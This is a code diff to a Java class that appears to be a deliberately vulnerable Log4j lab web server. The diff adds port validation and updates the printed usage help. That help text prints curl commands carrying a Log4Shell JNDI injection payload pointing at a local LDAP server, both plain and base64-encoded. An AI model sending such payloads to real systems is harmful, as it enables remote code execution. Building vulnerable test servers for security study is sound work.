@@ -20,23 +20,31 @@ public class Log4jWebServer {
     System.out.println("this will be logged via log4j.  The default port is 8888 but");
     System.out.println("it will take a single paramter as a port");
     System.out.println("");
+
+    int port = 8888;
+    if(args.length > 0){
+      try{
+        port = Integer.parseInt(args[0]);
+        if(port <= 0){throw new Exception();}
+      }catch(Exception e){
+        System.out.println("Error parsing port number.  Please enter a valid number.");
+        System.exit(-1);
+      }
+    }
+    
     System.out.println("You can call it using curl. Depending on your terminal you ");
     System.out.println("may need to escape the string :");
-    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:8888/");
+    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:"+port+"/");
     System.out.println("");
     System.out.println("If the log_me header is not found it will look for a log_me_b64");
     System.out.println("header and do a base 64 decode prior to logging.");
     System.out.println("The above log_me curl example would look like : ");
-    System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:8888/");
+    System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:"+port+"/");
     System.out.println("");
     System.out.println("On a linux system with base64 installed you can also use : ");
-    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64 -w 0`\" http://127.0.0.1:8888/");
+    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64 -w 0`\" http://127.0.0.1:"+port+"/");
     System.out.println("");
-
-    int port = 8888;
-    if(args.length > 0){
-      port = Integer.parseInt(args[0]);
-    }
+   
     new Log4jWebServer().runServer(port); 
   }
 
